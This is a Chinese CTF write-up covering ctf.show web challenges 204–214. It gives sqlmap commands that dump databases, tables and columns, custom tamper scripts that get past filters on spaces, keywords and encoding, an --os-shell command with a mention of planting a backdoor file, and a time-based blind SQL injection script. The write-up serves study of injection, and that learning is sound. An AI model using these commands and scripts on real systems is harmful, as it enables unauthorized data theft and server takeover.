<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://9ff3b4f8-f542-4dde-ba3e-048ba175cf8e.challenge.ctf.show/api/index.php&quot;</span>  --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=ec3c49c1lgq7e4pohgsk89g90g;ctfshow=05fcd4334159472a05a47cfa2cf3c3b5;&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>这个题目一开始访问<code>/api/index.php</code> 会先有个鉴权的动作，即会先访问<code>/api/getToken.php</code> ，针对这种情况，需要用到<code>--safe-url参数和--safe-freq参数</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/index.php&quot;</span>  --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=jfoi7tfi0na97dn5601sc1mmt7&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --dbs  <span class="comment">#爆库</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/index.php&quot;</span>  --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=jfoi7tfi0na97dn5601sc1mmt7&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web --tables <span class="comment">#爆表</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/index.php&quot;</span>  --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=jfoi7tfi0na97dn5601sc1mmt7&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flax --columns<span class="comment">#爆字段名</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/index.php&quot;</span>  --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=jfoi7tfi0na97dn5601sc1mmt7&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://fdd5f8bc-7f36-4f96-b250-6c2fa87c6216.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> -D ctfshow_web -T ctfshow_flax --dump <span class="comment">#爆值</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>同web205</p>
<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><p>这个题目主要是把空格给过滤了，可以用<code>/**/</code> 来绕过。这里可以直接用现成的tamper脚本，加上<code>--tamper=&quot;space2comment.py&quot;</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://983a9b28-03e7-4200-8db5-08ecf0aba8c9.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --headers=<span class="string">&quot;Content-type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=cc2pif4n8c281otiedt78s352o&quot;</span> --safe-url=<span class="string">&quot;http://983a9b28-03e7-4200-8db5-08ecf0aba8c9.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=space2comment.py --dbs</span><br></pre></td></tr></table></figure>

<p>当然也可以直接去编写<code>tamper</code>脚本，这里我写了一个<code>test.py</code>，然后放在<code>/sqlmap/tamper</code>下，也是可以的。<code>test.py</code> 内容为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>经过测试，发现也是可以的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://b03b859c-35e1-4c50-88c6-fa7c06b67c9a.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --headers=<span class="string">&quot;Content-type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=u5l9sgt0ik1c77nn4k7fcospaj&quot;</span> --safe-url=<span class="string">&quot;http://b03b859c-35e1-4c50-88c6-fa7c06b67c9a.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=test.py --dbs</span><br></pre></td></tr></table></figure>

<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><p>在空格过滤的基础上，加上了对<code>select</code>的过滤，把select替换成空，这里可以双写绕过。当然其实这里没有严格区分大小写，可以大写去绕过。而且sqlmap本身就是大写的<code>SELECT</code>,所以这里不需要双写绕过。还有一点，看到别的师傅的payload:<code>--prefix=&quot;&#39;)&quot;</code>，指明了闭合方式，其实这里不指明也可以。sqlmap可以去识别。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://1c23fe25-e0c5-4bab-921d-402132c1b011.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=ia7o1r6mmfrjho7b44hqspc21e&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://1c23fe25-e0c5-4bab-921d-402132c1b011.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=test.py,test2.py --dbs</span><br></pre></td></tr></table></figure>

<p>当然这里的<code>test2.py</code>不加也是可以的，<code>test2.py</code>脚本内容如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload=payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;seselectlect&quot;</span>)</span><br><span class="line">    payload=payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><p>过滤了<code>=</code>，可以用<code>like</code>来替代，编写<code>tamper</code>脚本如下: web209:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retval=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                retval+=<span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                retval=retval+<span class="built_in">chr</span>(<span class="number">0x09</span>)+<span class="string">&#x27;like&#x27;</span>+<span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retval=retval+i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://80472d35-c6cb-459d-9632-2dd1b2b39524.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=0s03qdjka7rjua3k9o5r3e6loa&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://80472d35-c6cb-459d-9632-2dd1b2b39524.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=web209.py --dbs</span><br></pre></td></tr></table></figure>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照这个结构，逆向编码一下就行了，先反转，再base64编码，再反转，再base64编码，按照这个结构来写脚本即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">    payload = base64.b64encode(payload.encode())</span><br><span class="line">    <span class="keyword">return</span> payload.decode()</span><br></pre></td></tr></table></figure>

<p>不过这里有个问题，<code>bytes</code>和<code>str</code>。</p>
<p><code>base64.b64encode(payload)</code>，这里的payload对象必须为bytes，所以前面需要<code>encode</code>编码一下。同时，最终的payload得是<code>str</code>格式。所以需要<code>decode</code>一下，不然会打不通。。</p>
<p>最终payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">    payload = base64.b64encode(payload.encode())</span><br><span class="line">    <span class="keyword">return</span> payload.decode()</span><br></pre></td></tr></table></figure>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>类似的，只是在210的基础上对空格做了限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">    payload = base64.b64encode(payload.encode())</span><br><span class="line">    <span class="keyword">return</span> payload.decode()</span><br></pre></td></tr></table></figure>

<p>最终的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://9fff402d-4607-4757-b470-23de14bba515.challenge.ctf.show/api/index.php&quot;</span> --me</span><br><span class="line">thod=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=h0n53gugrlmej78r0ba32m1r5b&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://9fff402d-4607-4757-b470-23de14bba515.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=web211.py --dbs</span><br></pre></td></tr></table></figure>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><p>和212差不多，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://29e67444-b822-426c-af57-7a96c6b58b4b.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=g7toueeq90nqcsn1n5fgtn495u&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://29e67444-b822-426c-af57-7a96c6b58b4b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=web211.py --dbs</span><br></pre></td></tr></table></figure>

<p>web212.py的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">    payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">    payload = base64.b64encode(payload.encode())</span><br><span class="line">    <span class="keyword">return</span> payload.decode()</span><br></pre></td></tr></table></figure>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>可以直接用212的脚本打，但是flag是不在表里面的，所以这里出题人是希望用<code>os-shell</code>。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://114fe8c6-6bcc-4fbb-a41d-a242a8c019ea.challenge.ctf.show/api/index.php&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=224gksca18lh1o4rnodabjcjk8&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://114fe8c6-6bcc-4fbb-a41d-a242a8c019ea.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=web212.py --os-shell</span><br></pre></td></tr></table></figure>

<p>这里有个问题，我在官网下载的最新版的<code>sqlmap</code>，拿不到反弹的shell，但是可以写一个文件上传的PHP脚本进去。写进去之后再去访问上传一个后门文件即可。</p>
<p>换了ctfshow网站上给的那个版本的sqlmap，是可以正常弹shell的：</p>
<p><img src="https://img.picui.cn/free/2024/11/11/6731b4686e11f.png" alt="web213.png"></p>
<p>然后去根目录下找到flag即可。</p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>考察的是时间盲注，注入点找半天没找出来，放弃了。。看了下wp发现是<code> /api/index.php</code>。然后<code>post</code>传 <code>ip</code>和<code>debug</code>，没啥过滤，基本上直接打。把之前时间盲注二分法的脚本拿过来改一下就可以用了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://ec48efbb-ce6f-471c-86de-da3af0549418.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&#x27;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

